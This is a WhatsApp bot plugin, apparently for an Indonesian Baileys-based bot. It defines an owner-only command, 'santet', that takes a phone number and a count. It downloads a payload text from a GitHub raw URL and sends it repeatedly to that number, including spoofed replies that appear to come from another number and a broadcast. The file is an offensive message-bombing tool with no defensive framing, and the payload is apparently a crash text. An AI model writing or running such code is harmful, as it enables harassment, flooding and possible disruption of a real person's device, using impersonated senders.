import fetch from 'node-fetch'
import util from 'util';
const sleep = util.promisify(setTimeout);
const { default: makeWASocket, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, downloadContentFromMessage, downloadHistory, proto, getMessage, generateWAMessageContent, prepareWAMessageMedia } = (await import('@adiwajshing/baileys')).default
let handler = async (m, { conn, text }) => {
    const pesan = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v12.txt")).text()
    const [ nomor, jumlah ] = text.split('|')
    const fixedNumber = nomor.replace(/[-+<>@]/g, '').replace(/ +/g, '').replace(/^[0]/g, '62') + '@s.whatsapp.net'
    const fixedJumlah = jumlah ? jumlah * 1 : 10
    try{
        for(let i = 1; i < fixedJumlah; i++){
            conn.reply(fixedNumber, pesan, m)
            conn.fakeReply(fixedNumber, `${pesan}`, '15517868074@s.whatsapp.net', `${pesan}`, '0@s.whatsapp.net@broadcast')
            await sleep(3000);
            m.reply(i+' Pesan Terkirim bos')
        }
        m.reply(fixedJumlah+' Pesan Terkirim bos')
    }catch(e){
        m.reply('Santuy Saja Bos\n'+e)
    }
}
handler.help = ['santet <nomor>']
handler.tags = ['tools']
handler.command = ['santet']
handler.group = false
handler.premium = false
handler.private = false
handler.limit = false
handler.owner = true
export default handler
